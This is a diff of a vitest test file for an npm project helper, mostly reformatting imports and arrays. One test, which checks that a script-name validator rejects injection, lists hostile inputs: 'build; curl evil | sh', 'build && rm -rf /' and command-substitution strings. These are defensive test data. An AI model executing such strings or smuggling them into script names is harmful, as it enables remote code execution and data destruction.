@@ -1,7 +1,12 @@
 import { describe, it, expect } from 'vitest';
 import {
-  decideScript, detectPackageManager, installPlan, isSafeScriptName,
-  readPackageManagerField, readPackageScripts, runPlan,
+  decideScript,
+  detectPackageManager,
+  installPlan,
+  isSafeScriptName,
+  readPackageManagerField,
+  readPackageScripts,
+  runPlan,
 } from './npmProject';
 
 describe('which package manager builds this project', () => {
@@ -73,7 +78,9 @@ describe('the scripts of a package.json', () => {
   });
 
   it('ignores entries that are not commands', () => {
-    expect(readPackageScripts('{"scripts":{"dev":"vite","x":{"nested":true}}}')).toEqual({ dev: 'vite' });
+    expect(readPackageScripts('{"scripts":{"dev":"vite","x":{"nested":true}}}')).toEqual({
+      dev: 'vite',
+    });
   });
 
   it('picks up the declared manager', () => {
@@ -94,7 +101,14 @@ describe('what may be run', () => {
    * as a script name is the whole reason the check exists.
    */
   it('refuses anything a shell would read as more than a name', () => {
-    for (const name of ['build; curl evil | sh', 'build && rm -rf /', '$(whoami)', 'a b', '`x`', '']) {
+    for (const name of [
+      'build; curl evil | sh',
+      'build && rm -rf /',
+      '$(whoami)',
+      'a b',
+      '`x`',
+      '',
+    ]) {
       expect(isSafeScriptName(name), name).toBe(false);
     }
   });
